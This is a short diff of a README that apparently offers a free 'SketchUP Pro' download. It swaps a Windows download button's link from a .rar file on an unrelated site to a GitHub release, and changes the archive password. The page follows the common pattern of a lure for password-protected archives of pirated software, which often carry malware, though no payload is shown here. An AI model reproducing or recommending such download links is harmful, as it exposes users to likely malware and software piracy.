@@ -16,10 +16,10 @@
 > [!NOTE]
 > - **Select a version**
 
-[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://lesfrancs-tireurs.net/temp/Software.rar)
+[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://github.com/ajay-mali27/SketchUP-Pro/releases/tag/SketchUP)
 
 > [!NOTE]
-> **PASSWORD: DOWNLOAD2121**
+> **PASSWORD: SKETCHUP2024**
 
 
 
